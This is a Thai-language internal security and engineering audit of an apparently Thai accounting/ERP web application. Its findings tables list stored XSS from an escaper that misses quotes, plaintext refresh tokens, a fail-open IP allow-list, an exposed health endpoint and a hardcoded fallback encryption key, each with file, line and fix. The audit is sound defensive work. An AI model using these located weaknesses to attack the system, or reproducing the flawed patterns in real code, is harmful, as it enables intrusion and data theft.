| F-14 | P2 | ChatbotService.cs:53,172,194 | static _recentAnswers ไม่ลบ/ไม่ตัดขนาด ป้อนจาก AskPublicAsync (anon) | ยิงคำถามต่างกันเรื่อย ๆ → memory หมด | IMemoryCache size limit + TTL 10 นาที หรือ DB | S |
| F-15 | P2 | AuthService.cs:331-361 | RefreshToken/PreviousRefreshToken เก็บ plaintext ใน Users (rotation+reuse detection ถูกแล้ว) | DB รั่ว = สวมเซสชันไม่ต้องรู้รหัส | เก็บ SHA-256 (แบบ VendorPortalTokens.TokenHash) | S |
| F-16 | P2 | Program.cs:974-1008 | `GET /health/db` anonymous คืนคอลัมน์/ตาราง 14 ตัว + `EF_ModelBuilding: FAILED: {msg}` + `{ex.Message}` (มัก含 connection host/user) · เปิด NpgsqlConnection ใหม่ทุก request | เปิดเผยโครงสร้าง DB + ยิงถี่ทำ pool เต็ม | RequireAuthorization SystemAdmin/เครือข่ายภายใน · ตัด exception message | S |
| F-17 | P2 | ApiKeyMiddleware.cs:75-85 | `clientIp != null && !allowed.Contains` — IP null = ข้ามด่านเงียบ (fail-open) · IPv6-mapped `::ffff:1.2.3.4` ไม่ตรง (fail-closed ไล่ไม่เจอ) | IP allow-list ไม่ทำงานบางสภาพแวดล้อม | fail-closed เมื่ออ่านไม่ได้ · MapToIPv4 · CIDR | S |
| F-18 | P3 | appsettings.Production.json:9 `AllowedHosts: *` | | cache poisoning / ลิงก์รีเซ็ตจาก Host | ระบุโดเมน | S |
| F-19 | P3 | AuthDtos.cs:10-12 `[MinLength(8)]` เท่านั้น | | + F-10 = brute-force ง่าย | ≥12 + common-password list | S |
| F-20 | P3 (สงสัย) | Program.cs:800 `/uploads/signatures` ใน allow-list สาธารณะ | ภาพลายเซ็นเสิร์ฟไม่ต้องล็อกอิน (GUID = obscurity) | PDPA ม.26 ชีวมิติ | เสิร์ฟผ่าน endpoint ตรวจ JWT+CompanyId (ต้องยืนยันว่า PDF ไม่ต้องการลิงก์ตรง) | M |
| ~~F-XX~~ | ถอน | SignatureApprovalController.cs | รายงานรอบแรกว่า companyId จาก query = IDOR — **ไม่จริง**: ไฟล์มี 3 คลาส endpoint อนุมัติอยู่ใต้ `api/companies/{companyId:guid}/approvals` guard ครอบ · UserSignatureController ผูก userId จาก JWT | | | |

## Multi-instance readiness — พร้อม: UndueInputVatExpiryJob (lock) · EclAllowanceJob (unique index) · IdempotencyMiddleware (DB) · ChatRateLimiter (DB) · ไม่พร้อม: job อีก 11 ตัว · global/API-key rate limit (static) · chat dedupe (static+leak) · **DataProtection keys (ร้ายสุด)** · ไฟล์อัปโหลดบน local disk (ผิดข้อ D) · Puppeteer ไม่จำกัด concurrency
## Performance hot spots — ApiKey ทุก request (bcrypt+write) · startup 1,660 DDL · OcrService.cs:5028-5029/5302-5303 ChartOfAccounts ต่อบรรทัด · :3830-3851 OcrLearnedPatterns 2 query/field · :7165-7167 Products ต่อบรรทัด · PdfGenerationService.cs:591-598 CoA ต่อรหัสต่อบรรทัด · :435-436 Documents ต่อบรรทัด JE · PosService.Orders.cs:154,251,559,995 Products.FindAsync ในลูป · BankService.MatchCandidates.cs:101-243 ~10 query/รอบ · SubLedgerReconciliationService.cs:65-136,185-189 N+1 ต่อบัญชี · /health/db 15 query ไม่มี auth · index ที่ขาด: JournalEntries/Payments/PosOrders/WithholdingTaxCerts (CompanyId, Number) unique
## ที่ทำดีแล้ว: GetDocumentsAsync แบ่งหน้า · batch e-Tax/ProjectCost · PageSize clamp 1-200 · trigram GIN บน Documents.DocumentNumber/Contacts.Name/Products.Name/ChartOfAccounts.AccountName · composite index Documents 5 ชุด · DateTime.Now = 0 จุด · appsettings ไม่มี secret · webhook HMAC FixedTimeEquals · global query filter = !IsDeleted เท่านั้น (IgnoreQueryFilters 40 จุดไม่ใช่ช่องรั่ว tenant)
## Re-design: 1 กลับด้าน TenantGuardFilter (`[NonTenantScoped]` explicit) · 2 tagged template `tpl` ที่ escape อัตโนมัติ + `raw()` + checker innerhtml_escape_check (negative test = admin/users.html:133) · 3 origin แยกสำหรับไฟล์ผู้ใช้ · 4 SequenceGenerator ตัวเดียว + unique index · 5 migration แยกจาก startup (แอปแค่ตรวจ schema version) · 6 ยก state ออกจาก process ทั้งหมด (F-06 ก่อน replica ที่ 2) · 7 นโยบาย controller ที่แตะเงิน/ภาษี/HR/สิทธิ์ ต้องมี RequirePermission ระดับคลาส default
## ยังไม่ได้อ่าน: Services/Implementations ส่วนใหญ่ (~200 ไฟล์) CompanyId ทีละ query · _db.Users 85 จุด (ไล่ taint เฉพาะ PDPA/DSR/Auth/Subscription) · CMS storefront anonymous 35 ep scope siteId+companyId ในบริการ · NotificationHub group per tenant · CmsRbacMiddleware/RequireSiteRole · ImpersonationReadonlyMiddleware (จุดเสี่ยงข้ามบริษัท) · Accounting.Tests ต่อ security control · **F-01/F-02 ควรยิงจริงบน staging ก่อนจัดลำดับ**


# ทีม G — Frontend engineering (verified by main: G-01 `Layout.esc` textContent→innerHTML ✔)

## ตัวเลขภาพรวม (grep/สคริปต์นับจริง)
| รายการ | จำนวน |
|---|---|
| .html ทั้งหมด | 160 (pages/ 119 · ราก 18 · admin/ 23) |
| ไม่โหลด layout.js / ไม่โหลด api.js | 46 (pages/ 6: dashboard, delivery-sign, line-bind, mobile-receipt, **quick-sale**, quotation-accept) / 40 (รวม admin/ ทั้ง 23) |
| alert / confirm / prompt | 124 / 197 / 102 |
| innerHTML = | 1,649 |
| **XSS ข้อความอิสระไม่หนี** | **970 จุด / 134 ไฟล์** (e.message ดิบ 73/45) |
| **XSS esc ไม่ครอบ quote วางใน attribute** | **170** (Layout.esc 82 จุด/25 ไฟล์) |
| สำเนา esc เขียนมือ | 36 ชุด (semantics ต่างกัน ≥5 แบบ) |
| fetch( ดิบไม่ผ่าน api.js | 291 |
| สำเนา format เงิน / แปลง พ.ศ. +543 | 131+99 / 37 จุด 20 ไฟล์ |
| catch ว่างเปล่า | 297 (154 ไม่มีแม้คอมเมนต์) / 1,564 |
| save/submit/approve/pay ที่ await แล้วไม่กันกดซ้ำ | 317 / 361 |
| table ไม่มี wrapper เลื่อนแนวนอน | 134 / 371 |
| `<th scope>` / aria-label / `<label for>` | **0**/1,958 · **3** · 52/2,110 (.form-label ลอย 927) |
| div/span/td/tr/li onclick (ปุ่มปลอม) | 254 |
| style= inline / #rrggbb ใน html / font-size ≤11px | 8,013 / 6,006 / 832 |
| type=number / ยอมรับ "1,000" | 344 / 5 |
| user-scalable=no | 3 (หน้ามือถือทั้งหมด) |
| i18n coverage pages/ | ~8.8% (823/9,327) · 61/119 หน้าไม่มี data-i18n · คีย์ตาย 619/1,045 (59%) |
| api.js เมธอดไม่มีใครเรียก / layout.js public ตาย | 101/753 (13.4%) / 6/99 |
| search จาก oninput ไม่ debounce | 12 หน้า (debounce มีแค่ 14 ไฟล์) |
| **ข้อเท็จจริง**: เรพ**ไม่มี Tailwind** (grep=0) — style.css เขียน utility เอง ⇒ CLAUDE.md "Tailwind CDN" ผิด (G-29) |

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| G-01 | P0 | js/layout.js:56 `esc` (div.textContent→innerHTML หนีแค่ & < > nbsp) vs :707 `_esc` (หนีครบ 5 แต่ private) | ตัวหนีที่ทั้งระบบใช้ไม่หนี `"` `'` | ทุก `${Layout.esc(x)}` ใน attribute แตกออกได้ · JWT ใน localStorage = ขโมย token | esc = _esc (replace 5 ตัว) ลบ _esc — **1 จุดปิด 82** | S |
| G-02 | P0 | 170 จุด เช่น organization.html:222,350 · leave-types.html:258,349 · document-scan.html:2776 (+ :2550 ไม่หนีเลย) · payroll.html:1369,855,1286,1291 · webhooks/journals:840/products:447 | `onclick="Page.deleteDept('${d.id}','${Layout.esc(d.name)}')"` | stored XSS ข้ามผู้ใช้ในบริษัท | หลัง G-01 ปลอดภัยสำหรับ attribute ธรรมดา · inline onclick ที่ฝังข้อมูล → data-* + addEventListener | M |
| G-03 | P0 | roles.html:498 · pos.html:2403 · pos-reservations.html:510 | ปะ `.replace(/'/g,'&apos;')` เอง — ไม่ช่วย (HTML decode ก่อน JS parse) · product-aliases.html:95 ใช้ `\\'` คนละสูตร | | เลิก escape มือ → data-* | S |
| G-04 | P0 | admin/payments.html:243,251,255,259,189 · admin/customers.html:111,112,114,115,219,642 · admin/users.html ×24 · admin-layout.js:87,92,93 | `${p.notes}` `${p.slipFileName}` `${p.slipOcrReference}` `${c.name}` ดิบ · admin-layout.js ไม่มี esc เลย · 14 หน้าไม่หนีอะไรเลย | ผู้เช่า → แอดมินแพลตฟอร์ม (114 จุดในโซนสิทธิ์สูงสุด) | AdminLayout.esc() + ไล่ 114 จุด | M |
| G-05 | P0 | app.html:698,704,710,716,722 | แดชบอร์ดหลัก render contactName/accountName/documentNumber ดิบ ทั้งที่โหลด layout.js | ชื่อลูกค้า/ผัง = ค่าที่ผู้ใช้/OCR คุม → หน้าแรกทุกคน | Layout.esc | S |
| G-06 | P1 | 36 ไฟล์: audit-log.html:77 (2 ตัว) · site-settings.html:639 (ไม่หนี & + คืน '' เมื่อ 0) · pdpa.html:241 · migrate-competitor.html:62 · storefront.html:808 (5) | esc เขียนมือ 36 ชุดคุณภาพต่างกัน | resolver กลางห้ามคำนวณเอง | js/esc.js ตัวเดียวให้ layout.js/admin-layout.js/standalone โหลด | M |
| G-07 | P1 | js/api.js 101 เมธอด — etaxSignAndSubmit/etaxQuickSubmit/etaxGeneratePdf/etaxDownloadXmlUrl (etax.html เขียน URL เองทั้ง 12 จุด :232,276,285,290,356,375,377,388,397,406,452,466) · voidJournal/batchVoidJournals · terminateEmployee · syncBankFeed+5 · connect/sync/disconnect/testECommerce · getNotifications/markRead… · ai*×8 | wrapper มีแต่หน้าไม่เรียก = URL 2 ชุด drift | | ต่อสายหรือลบทีละตัว | M |
| G-08 | P1 | js/layout.js:1868 `startTour` | คอมเมนต์บอก "17 หน้าเรียก enableTour/startTour" — startTour มี 0 caller | doc-comment โกหก | ลบ + แก้คอมเมนต์ | S |
| G-09 | P1 | js/layout.js: exportTableCSV · exportTableExcel · isSubscriptionActive · printElement · requireFeature · startTour | 1 occurrence = นิยามเอง | | ต่อสาย/ลบ | S |
| G-10 | P1 | approval.html:259 | bulk approve `try{await}catch(e){}` → toast "สำเร็จ ${ok}" | 5 ใบล้ม 3 = "สำเร็จ 2" ไม่บอกว่าใบไหนล้ม (บทเรียน IntegrationService ฝั่ง UI) | เก็บ {id,error} → PartialSuccess + list | S |
| G-11 | P1 | documents.html:1594 `catch { _vatRegistered = true; … }` | โหลด settings ล้ม → สมมติจด VAT | บริษัท §81 ยกเว้นออกใบกำกับที่ห้ามออก — ค่า default ที่แต่งขึ้น | บล็อกฟอร์ม + ลองใหม่ ห้ามเดา | S |
| G-12 | P1 (UI ยืนยัน / JE ซ้ำ สงสัย) | 317 จุด เช่น payroll.html:926 payRun · :917 approveRun · documents.html:9306 approve · journals.html:875 post · pos.html:1869 payPadConfirm · bank.html:1323 submitCreateJe | ไม่ disable ปุ่ม/ธง in-flight ระหว่าง await | ดับเบิลคลิก = POST 2 ครั้ง (ฝั่ง server เพิ่งได้ advisory lock บางจุด — ยังไม่พิสูจน์ idempotent ทุก endpoint) | `Layout.once(btn, fn)` disable+aria-busy+finally | M |
| G-13 | P1 | admin/* 23 หน้า | admin-layout.js ไม่มี esc · 9 หน้าเขียนเอง · 14 ไม่หนี · ไม่โหลด layout.js/api.js | | esc ใน admin-layout.js ก่อน แล้วค่อยพิจารณา lib ร่วม | S→L |
| G-14 | P2 | ทั้งระบบ | th scope 0/1,958 · aria-label 3 · label for 52/2,110 · ปุ่ม emoji ไม่มีชื่อ | screen reader อ่านตารางบัญชีไม่ออก | scope=col · ผูก for · aria-label | L |
| G-15 | P2 | 254 จุด (documents 20 · cms-edit 17 · settings 14) | div/tr onclick เป็นปุ่มจริง | Tab/Enter ไม่ทำงาน | button หรือ role=button tabindex=0 + keydown | M |
| G-16 | P2 | style.css:215-230 · layout.js:2110 · admin/customers(1)/users(3)/payments(2) · portal.html(5) | ไม่มี focus trap · ไม่ย้าย/คืนโฟกัส · modal ใน admin/portal ไม่มี Esc | | trap ใน _ensureModalKeyboardWired จุดเดียว | M |
| G-17 | P2 | mobile-expense.html · mobile-receipt.html · delivery-sign.html | user-scalable=no/maximum-scale=1 | WCAG 1.4.4 · หน้าที่ใช้นอกออฟฟิศพอดี | ลบ | S |
| G-18 | P2 | 134 table: wht.html(16) executive-reports(10) bank(9) documents(7) | ไม่ห่อ .table-container (style.css:189 มีแล้ว) | จอแคบเลื่อนทั้งหน้า คอลัมน์แรกถูกตัด | ห่อ | M |
| G-19 | P2 | 344 type=number เช่น journals.html:563,564 · payments.html:50 | วาง "1,234.56" จาก Excel → value='' เงียบ (ตัวลอก , มีแค่ 5 จุด) | ยอดหายเงียบ | type=text inputmode=decimal + Layout.parseMoney | M |
| G-20 | P2 | 12 หน้า: bank, accounts, audit, document-scan … | oninput search ไม่ debounce (Layout.debounce มีแล้ว) | 12 request ผลไม่เรียง = ใครมาก่อนชนะ | debounce + AbortController | S |
| G-21 | P2 | documents.html:6350 · purchases.html:244 · journals.html:332 | `pageSize=10000` render string concat | บริษัท 2 ปีค้างสิบวินาที | server paging/virtual list | M |
| G-22 | P2 | cost-report:189 · deposit-center:403 · document-templates:598,670,683,829 · bank:828,1991 · admin/payments:409 | tbody = rows.map ไม่มีสาขา 0 แถว (ภาพรวมดี 151/184 มีแล้ว) | ว่างเปล่าแยกไม่ออกจากล้ม | emptyRow | S |
| G-23 | P2 | 73 จุด/45 ไฟล์ เช่น admin/customers:140 · admin/plans:130 · documents:10538 | `${e.message}` ดิบใน innerHTML | exception รั่ว + reflected XSS | Layout.toast (escape แล้ว :1969) / textContent | S |
| G-24 | P2 | documents.html:10122,10143 | `prompt()` เป็นกล่องโชว์ลิงก์เซ็นรับสินค้า | มือถือคัดลอกยาก · in-app browser บล็อก prompt (มี inapp-browser-guard.js = รู้ว่ามีปัญหา) | modal readonly + copy + QR | S |
| G-25 | P3 | payroll.html:944 | prompt() มี `**…**` markdown | เห็นดอกจัน | ตัด/ย้าย modal | S |
| G-26 | P3 | index.html:403-405 (+58) · fpa.html:290,291 · fixed-assets.html:644 | `.text-gray-300 .mt-1 .mt-2 .mb-1` ไม่มีนิยาม (ไม่มี Tailwind) | ตาราง "เทียบคู่แข่ง" ✗ เข้มเท่า ✓ อ่านผิดว่ามีฟีเจอร์ครบ — ญาติ var(--red-700) | เพิ่ม 4 คลาส + checker util_class_check (เขียนแล้ว ผ่าน negative test) | S |
| G-27 | P3 | ทั้งระบบ | i18n 8.8% · 61/119 ไม่มี · 619 คีย์ตาย · 10 คีย์เมนูอ้างแล้วไม่มี (nav.cmsSites/cmsOrders/cmsLeads/cmsBookings/documentScan/notifications/organization/roles/salaryAdvance) | en = ผสมทุกหน้า | ตัดสินใจ: ทำต่อจากหน้าที่ต่างชาติเห็น หรือลบ 619 คีย์ (ดู B-R4) | L |
| G-28 | P3 | pages/deposits.html · pages/review-queue.html | 0 ref (deposits = redirect stub ตั้งใจ แต่เหลือ markup+JS 290 บรรทัดใต้ redirect · review-queue orphan จริง) | | review-queue ต่อสาย (E-OCR-06) · deposits ตัดเนื้อในเหลือ redirect (H-A23) | S |
| G-29 | P3 | CLAUDE.md "vanilla HTML + Tailwind CDN" | grep tailwind = 0 | agent เขียนคลาส Tailwind แล้วไม่มีผลเงียบ (พิสูจน์ใน G-26) | แก้ doc: "utility subset เขียนเองใน css/style.css คลาสใหม่ต้องประกาศเอง" | S |
| G-30 | P3 | loans:166 · fiscal:169 · petty-cash:158 · production:149 · multi-currency:174,219 · consolidation:133 · dimensions:255 · payroll:1744 · cms-edit:2507 | openCreate ไม่ล้างค่าเดิม (ภาพรวมดี 106/116) | บันทึกซ้ำโดยไม่ตั้งใจ | form.reset() | S |

## รายการ XSS เต็ม: สคริปต์ `xss2.py`/`attr_esc.py` + ผล `xss2.out`/`attr_esc.out` อยู่ใน scratchpad ของ session (parser รู้จัก template literal ซ้อน/regex literal/คอมเมนต์แบบรู้สถานะสตริง) — ไฟล์หนักสุด: documents.html(94) bank.html(48) admin/customers(33) admin/users(24) reports(23) cms-edit(23) executive-reports(22) document-templates(20) journals(19) ai-tools(19) payroll(18) document-scan(18) products(17) layout.js(17) app.html(17) …
## checker ใหม่ที่เสนอ: 1 `esc_attr_check.py` (ติดตามสถานะ HTML ใน template literal: `${}` ในค่า attribute ที่ผ่าน esc ไม่ครอบ quote หรือไม่ผ่านเลย — negative: `title="${Layout.esc(x)}"` ฟ้อง · `_esc` ไม่ฟ้อง · `<td>${Layout.esc(x)}</td>` ไม่ฟ้อง) · 2 `inline_handler_data_check.py` (on*="…('${expr}'…)" ที่ expr ไม่ใช่ GUID/ตัวเลข — `&apos;` ต้องยังฟ้อง) · 3 `util_class_check.py` (**เขียนแล้ว ผ่าน negative test** 4 ชื่อ/64 จุด) · 4 `double_submit_check.py` · 5 `api_wrapper_bypass_check.py` (หน้าเขียน URL ที่ api.js มี wrapper) · **ไม่เขียน** th scope/label for เพราะผิด 100% จะฟ้องทุกบรรทัด — รอแก้ก่อนแล้วตั้งเป็นด่านกันถอยหลัง
## Re-design (ไม่มี build step ย้ายทีละหน้า): ชั้น 0 `js/esc.js` (esc/escAttr/escJs — 36→1) → 1 `js/fmt.js` (money/date/buddhistYear/parseMoney — 131+99+37 จุด, ปิด G-19) → 2 `js/ui.js` Modal(focus trap)/Toast/Confirm/Ask (แทน alert/confirm/prompt 423 จุด, ปิด G-16/G-24) → 3 `js/table.js` renderTable ออก th scope + wrapper + escape ทุก cell (371 ตาราง — **คุ้มสุด** ปิด G-14/G-18/G-22 + XSS ส่วนใหญ่ของ 970) → 4 `js/form.js` field()+bindOnce (2,110 ช่อง · G-12 · G-30) · ลำดับ: esc.js+แก้ Layout.esc (1 คอมมิตปิด 82) → admin-layout esc + 3 หน้า admin (68/114) → table.js นำร่อง wht.html + inventory-reports.html → documents.html ไว้ท้ายสุด
## ยังไม่ได้ทำ: รันจริงในเบราว์เซอร์ (contrast/touch-target/360px ยังไม่วัด) · type=date กับปฏิทิน พ.ศ. 140 ช่อง (สงสัย) · G-12 ฝั่ง server idempotent จริงไหม · sw.js/PWA cache · onboarding.js/thai-address.js/translations.js เชิงตรรกะ · pages/financial-mgmt-logic.js + signatures-logic.js (.js วางผิดที่ใน pages/)


# ทีม H — โมดูลรอง 13 โมดูล (verified by main: H-A1, H-A2, H-A4 ✔)

## สุขภาพโมดูล
| โมดูล | end-to-end? | ต่อบัญชีถูก? | ของที่ไม่มีใครเรียก | คำแนะนำ |
|---|---|---|---|---|
| 1 ธนาคาร/กระทบยอด | ✅ นำเข้า→จับคู่→กลุ่ม→รายงาน · ❌ Open Banking | ✅ JE จาก txn/group unwind | `SyncTransactionsAsync` เป็นของปลอม | ทำต่อแกน · **ซ่อน/ติดป้าย "เร็ว ๆ นี้"** แท็บ Open Banking |
| 2 POS | ✅ ขาย→ปิดบิล→Z report · ⚠️ ปิดกะไม่กระทบเงินขาด/เกิน | ⚠️ JE/COGS/tip ถูก แต่วันที่=UtcNow + FIFO/negative-stock ไม่ผ่าน costing service | IInventoryCostingService · ThaiDate ฝั่ง POS | ทำต่อ (แก้ 4 จุด) |
| 2b quick-sale | ❌ **พังสนิท** | — | — | ซ่อมด่วน 1 บรรทัด |
| 3 E-commerce Shopee/Lazada | ❌ ไม่มี UI · sync ใช้ไม่ได้ | ✅ Draft path ถูกแต่ 0 บรรทัดสินค้า | ECommerceService + api.js 6 เมธอด | **re-design หรือตัดทิ้ง** |
| 3b/4 CMS commerce+booking | ✅ ตะกร้า→ชำระ→ERP→JE→stock→e-Tax | ✅ (ดีสุดในกลุ่ม) | ธง ErpSyncFailed ที่ doc อ้าง | ทำต่อ + โชว์ internalNotes |
| 4b CMS เว็บไซต์ | ✅ subdomain/custom domain routing จริง | n/a | — | ทำต่อ (อ่านตื้น) |
| 5 โครงการ/มิติ/งบ/Time billing | ✅ projects/budget · ❌ ปุ่มออกใบแจ้งหนี้จากเวลา | ❌ VAT=0 | มิติบนบรรทัดสมุดรายวัน | ซ่อม time billing |
| 6 สินทรัพย์ถาวร | ✅ ครบวงจร | ✅ | — | ทำต่อ (สมบูรณ์สุด) |
| 7 สินค้าคงคลัง | ⚠️ FIFO/WA จริง + stock take + โอนคลัง · ❌ WarehouseStock ไม่อัปเดตตอนขาย · ❌ ไม่มี LCNRV | ⚠️ | RebuildAverageCostAsync (1 caller) | **re-design ชั้นคลัง** |
| 8 นำเข้า/ส่งออก | ✅ import + smart + AI mapping · ⚠️ XLSX ได้ CSV | n/a | — | ซ่อม export format |
| 9 Connected API | ❌ **ออกคีย์ที่ใช้ /api/v1 ไม่ได้เลย** | n/a | ApiKey.Scopes/WebhookUrl/WebhookSecret/IsSandbox/BranchId/ConnectorType · UsageEvent 0 แถว | ทำต่อ — ฟอร์ม scopes (ปลดล็อกทั้งผลิตภัณฑ์) |
| 10 Subscription/บิลลิ่ง | ✅ trial→ชำระ→สลิป→อนุมัติ→เอกสารจริง | ✅ PlatformBillingDocumentIssuer ลง JE+VAT | resolve โควตาผ่าน Company.BillingAccountId (§5) ยังไม่มี | ทำต่อ |
| 11 แจ้งเตือน/อีเมล/LINE/recurring | ⚠️ ครบแต่ **default = เงียบทั้งหมด** | n/a | — | ซ่อม cold-start |
| 12 Portal/signatures | ✅ vendor+customer portal+ลายเซ็น | ✅ | — | ทำต่อ (อ่านตื้น) |
| 13 Multi-branch/สนง.บัญชี/deposits | ⚠️ ทะเบียน+เอกสารต่อสาขา ✅ · GL ต่อสาขา ❌ | ❌ JE ไม่ติดสาขา | (deposits.html = redirect ตั้งใจ) | ทำเฟส 2 |

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| H-A1 | P0 | quick-sale.html:380 `Layout.toDateInput()` (+:125-130 จงใจไม่โหลด layout.js) · catch :404 | ReferenceError ทุกครั้งที่กดบันทึก → "❌ Layout is not defined" | หน้าขายเร็วขายไม่ได้เลย (เมนู layout.js:436 + ปุ่มมือถือ :1231) | local helper วันที่ (ห้าม toISOString) | S |
| H-A2 | P0 | TimeBillingService.cs:321,343 | VatAmount=0, VatRate=0 ตายตัว ไม่อ่าน IsVatRegistered | ใบแจ้งหนี้ค่าบริการไม่คิด VAT 7% → ภ.พ.30 ขาด + ใบเพิ่มหนี้ตามทีหลัง (§78/1) | เดินผ่าน IDocumentService.CreateDocumentAsync แบบ CmsCommerceService.SyncOrderToErpAsync | M |
| H-A3 | P0 | PosService.Orders.cs:1141 (JE EntryDate) · :400,404,413 (DocumentDate/NumberGenerator) | DateTime.UtcNow ตรง ๆ ไม่ผ่าน ThaiDate.CalendarDateUtc (DocumentService:942,945,2044 ใช้) | ขาย 00:00–07:00 ICT (ร้านอาหาร/บาร์) JE+ใบกำกับ+เลขชุด yyyyMM ตกวัน/เดือนก่อน → ภ.พ.30 ผิดงวด | ThaiDate.CalendarDateUtc ทุกจุด | S |
| H-A4 | P0 | SettingsService.cs:418-432 vs Controllers/V1/PublicApiControllerBase.cs:62-67 | จุดสร้าง ApiKey แห่งเดียวไม่เคยเซ็ต Scopes (grep `.Scopes = ` = 0) แต่ base ปฏิเสธ scope ว่าง | /api/v1 ocr/bank/contacts/documents ใช้ไม่ได้เลย (ACCOUNT_STRUCTURE §3.1 ติด ✅) · UsageEvent call site เดียวอยู่ที่นั่น ⇒ ไม่มีวัน metering · error ชี้หน้าที่ไม่มีช่อง | เพิ่ม scopes/branch/sandbox/webhook ใน CreateApiKeyRequest+SettingsService+ฟอร์ม webhooks.html หรือ /connect | M |
| H-A5 | P1 | OpenBankingService.cs:99-129 | คอมเมนต์ "Here we simulate" — นับ BankTransactions เดิมแล้วรายงาน New/AutoMatched + LastSyncStatus=Success | ผู้ใช้กดซิงก์เห็นตัวเลขสวย ทั้งที่ไม่มีรายการใหม่ → เชื่อว่ากระทบครบ | ซ่อนหลัง feature flag + คืน NotImplemented | S |
| H-A6 | P1 | OpenBankingService.cs:22-25 | OPENBANKING_ENCRYPTION_KEY ตกไป "DefaultKeyForDev-Change-In-Production!" เงียบ (ต่างจาก JWT/ENCRYPTION_KEY ที่ fail-fast Program.cs:58-98) | credential ธนาคารเข้ารหัสด้วยคีย์ใน source | fail-fast | S |
| H-A7 | P1 | PosService.cs:112-118 vs pos.html:1192 | UI บอก "ระบบจะกระทบยอดเงินขาด/เกิน" แต่ CloseSession เก็บแค่ Expected/Closing — ไม่มี JE (grep CashDifference/เงินขาด=0) | เงินขาด/เกินไม่เข้า GL เงินสดค้างยอดทฤษฎี | JE Dr/Cr 5xxx เงินขาด-เกิน + บล็อกเกินเพดานโดยไม่มีเหตุผล | M |
| H-A8 | P1 | PosService.Orders.cs:998 · :1027-1031,1113-1121 | `product.CurrentStock -= qty` ตรง ไม่ผ่าน IInventoryCostingService (FIFO ได้ CostPrice นิ่ง · ไม่มี AllowNegativeStock · ไม่แตะ WarehouseStock) | COGS ผิดสำหรับ FIFO · ขายทะลุสต๊อก | ResolveOutboundCostAsync ใน Complete/SyncOffline แบบ DocumentService:12392-12397 | M |
| H-A9 | P1 | ProductService.cs:248-260 จุดเดียวที่เขียน WarehouseStock (นอกจาก WarehouseService โอน) | การขายทุกทาง (Document/POS/CMS/Production) ไม่แตะ WarehouseStock | หน้า "คลังสินค้า" ผิดถาวรทุกกิจการที่ขายจริง | helper กลาง `ApplyStockAsync` ตัวเดียว (R3) | L |
| H-A10 | P1 | ECommerceService.cs:295 | ParseOrders `Items = new List<>()` เสมอ | ใบกำกับ auto-create 0 บรรทัด → hard-block §86/4 · ไม่มี COGS/stock | fetch order detail แล้ว map หรือตัดโมดูล | M |
| H-A11 | P1 | ECommerceService.cs:236-258 | Bearer+X-Api-Key ไม่มี HMAC sign/partner_id/timestamp (Shopee v2/Lazada บังคับ) · `!IsSuccessStatusCode → return empty` กลืน | ทุก sync Success/NewOrders=0 ตลอดกาล | อย่างน้อยคืน Failed + status จริง | S |
| H-A12 | P1 | ไม่มี HTML เรียก api.js:1057-1062 | ECommerceService 460 บรรทัด + controller เข้าไม่ถึงจาก UI | ลูกค้าที่ซื้อเพราะ "เชื่อม Shopee" ใช้ไม่ได้ | ตัดสินใจ: แท็บใน integrations.html (:186 พูดถึง Shopee) หรือลบทั้งชุด | S–M |
| H-A13 | P1 | NotificationEngine.cs:74 · seed มีจุดเดียว NotificationConfigService.cs:53 (ผู้ใช้กดเอง) | tenant ใหม่ไม่มีแถว NotificationSettings ⇒ DispatchAsync return ทุก event ตามบทบาท | แจ้งเตือนทั้งก้อนเงียบตั้งแต่วันแรกไม่มีป้าย — ผิด cold-start | seed ตอนสร้างบริษัท หรือ default matrix เมื่อไม่มีแถว | M |
| H-A14 | P1 | CmsCommerceService.cs:988-989,1040-1048 vs cms-orders.html:421 | doc บอก "ปักหมุด InternalNotes + ErpSyncFailed" แต่ ErpSyncFailed ไม่มีทั้งเรพ · cms-orders ไม่แสดง internalNotes (เขียนทับที่ :421) | "เงินเข้าแล้วแต่บัญชี/สต๊อกยังไม่ลง" มองไม่เห็น | ธงจริง + ป้ายแดง + ปุ่มลองซิงก์ · ห้าม replace notes | S–M |
| H-A15 | P1 | DocumentService.cs:2592,3112,11202 (คัดแต่ ProjectId) vs AccountingService.cs:604-610 (กรอง JournalEntry.BranchId) | JE จากเอกสารไม่ติด BranchId ทั้งที่ Document.BranchId มี | ตัวกรองสาขาใน GL/งบทดลอง ว่างเสมอทุกบริษัท (ACCOUNT_STRUCTURE §3.1a ยอมรับเอง) | `BranchId = doc.BranchId` ทุกจุดสร้าง JE | S |
| H-A16 | P1 | time-billing.html:224 `generateTimeInvoice({})` vs TimeBillingDtos.cs:39-41 | ContactId=Guid.Empty ⇒ "No billable time entries found" ทุกครั้ง ไม่มี dropdown ลูกค้า | ปุ่มใช้ไม่ได้ตั้งแต่เขียน | เพิ่มตัวเลือกลูกค้า+ช่วงวัน · toast คืนเลขเอกสาร+ลิงก์ | S |
| H-A17 | P2 | ImportExportService.cs:437-461 (:457 BuildCsv ตายตัว) vs import-export.html:88,405 | UI มี XLSX แต่ service ไม่อ่าน FileFormat คืน CSV เสมอ | silent no-op | MiniExcel เขียน xlsx หรือถอดตัวเลือก | S |
| H-A18 | P2 | PosService.Orders.cs:1042 `if (salesAccount == null) return;` | ไม่มีบัญชี 41xxx → ออกจาก CreateSalesJournalEntry เงียบ ออเดอร์ปิดสำเร็จ (ต่างจาก catch :1147-1163 ที่ throw แล้ว) | ขายได้แต่ไม่มี JE = GL รั่ว | throw ไทยแบบ :1160-1162 | S |
| H-A19 | P2 | SubscriptionService.cs:605-652 | resolve แผนผ่าน Subscription.AccountSubscriptionId เท่านั้น ไม่มีเส้น Company.BillingAccountId (ACCOUNT_STRUCTURE §5 ข้อ 2) | บริษัท attach ทีหลังไม่ได้โควตา pool | fallback ข้อ 2 + แก้ป้าย §5 | S |
| H-A20 | P2 | ไม่มี IsRetailApproved/PhoR06ApprovedDate · pos.html:2249 พิมพ์ "ใบกำกับภาษีอย่างย่อ" ทุกใบ | §86/6 ไม่ gate ภ.พ.06 (= C-T07 ฝั่ง POS) | | 2 ฟิลด์บน Company + ด่านสลิป/receipt_abb | M |
| H-A21 | P2 | CmsCommerceService.cs:1128-1146 GenerateOrderNumber | max+1 ไม่มี advisory lock | WEB-2609-0007 ซ้ำ (ไม่ใช่ §86/4 แต่ dedupe พัง) | lock (companyId,"web-order",siteId) | S |
